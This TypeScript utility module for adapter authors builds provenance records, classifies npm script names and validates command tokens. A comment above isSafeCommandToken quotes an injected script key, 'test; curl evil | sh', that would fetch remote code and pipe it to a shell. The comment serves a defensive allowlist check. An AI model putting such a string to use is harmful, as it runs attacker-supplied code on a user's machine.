/**
 * Small builders for adapter authors.
 *
 * These exist so the common case - "I found something, here is where" - is one
 * line, and so the mandatory provenance fields cannot be forgotten. An adapter
 * that constructs claims by hand is free to do so; nothing here is required.
 */

import type { Provenance, ProvenanceTier, SourceRef, Timestamp } from "@project-surface/core";

export interface ProvenanceInput {
  tier: ProvenanceTier;
  adapter: string;
  now: Timestamp;
  sources: Array<SourceRef | string>;
}

/**
 * Whether a name read from a manifest may be interpolated into a command line.
 *
 * Script names, binary names and package managers come from repository
 * content, and `run` strings are executed through a shell by the evidence
 * runner. A script key such as `"test; curl evil | sh"` is legal JSON, so
 * adapters must refuse anything beyond the characters real tools use.
 */
export function isSafeCommandToken(name: string): boolean {
  return /^[A-Za-z0-9][A-Za-z0-9_.:@+\/-]{0,127}$/.test(name);
}

export function source(path: string, locator?: string): SourceRef {
  return locator === undefined ? { path } : { path, locator };
}

export function provenance(input: ProvenanceInput): Provenance {
  const sources = input.sources.map((s) => (typeof s === "string" ? { path: s } : s));
  if (sources.length === 0) {
    throw new Error(
      `Adapter "${input.adapter}" tried to build a claim with no sources. ` +
        `Every claim must name at least one file it came from.`
    );
  }
  return { tier: input.tier, sources, adapter: input.adapter, observedAt: input.now };
}

/**
 * Classify an npm-style script name into a command kind. Shared because every
 * adapter that reads a script table needs the same mapping, and inconsistent
 * classification across adapters makes `surface verify` unpredictable.
 */
export function classifyCommand(name: string): import("@project-surface/core").CommandKind {
  const n = name.toLowerCase();
  if (/^(test|tests|spec|check:test|unit|jest|vitest|pytest)(:|$)/.test(n)) return "test";
  if (/^(build|compile|bundle|dist)(:|$)/.test(n)) return "build";
  if (/^(dev|serve|watch|start:dev)(:|$)/.test(n)) return "dev";
  if (/^(lint|eslint|ruff|clippy|vet)(:|$)/.test(n)) return "lint";
  if (/^(typecheck|types|tsc|mypy)(:|$)/.test(n)) return "typecheck";
  if (/^(format|fmt|prettier|black)(:|$)/.test(n)) return "format";
  if (/^(start|serve:prod|run)(:|$)/.test(n)) return "start";
  if (/(migrate|migration)/.test(n)) return "migrate";
  return "other";
}

/**
 * Every match of a global pattern in `text`. The pattern's `lastIndex` is
 * reset first and left at zero, so one module-level `/g` regex can be shared
 * across lines and files without the state leaking between calls - and
 * without allocating a fresh `RegExp` per line, which the line-based parsers
 * used to do.
 */
export function matchAll(pattern: RegExp, text: string): RegExpExecArray[] {
  if (!pattern.global) throw new Error(`matchAll needs a global pattern: ${pattern}`);
  pattern.lastIndex = 0;
  const out: RegExpExecArray[] = [];
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(text)) !== null) {
    out.push(match);
    if (match[0].length === 0) pattern.lastIndex += 1;
  }
  pattern.lastIndex = 0;
  return out;
}

/**
 * Drop a `//` line comment - but not the `//` inside a string literal, so a
 * route registered as `"https://..."` keeps its path. `marker` is `//`
 * for C-family sources and `#` for TOML, Python or shell; `quotes` lists the
 * string delimiters (Rust passes `"` alone, since `'` opens a lifetime there).
 * Good enough for the structural parsers here; block comments are the
 * caller's business.
 */
export function stripLineComment(line: string, marker: string = "//", quotes: string = "\"'`"): string {
  let quote: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (quote !== null) {
      if (ch === "\\") i += 1;
      else if (ch === quote) quote = null;
      continue;
    }
    if (ch !== undefined && quotes.includes(ch)) quote = ch;
    else if (line.startsWith(marker, i)) return line.slice(0, i);
  }
  return line;
}

/** Environment variable names referenced by a source file, in appearance order. */
export function extractEnvNames(content: string, patterns: RegExp[]): string[] {
  const found = new Set<string>();
  for (const pattern of patterns) {
    const re = new RegExp(pattern.source, pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`);
    for (const match of matchAll(re, content)) {
      const name = match[1];
      if (name && /^[A-Z][A-Z0-9_]*$/.test(name)) found.add(name);
    }
  }
  return [...found].sort();
}
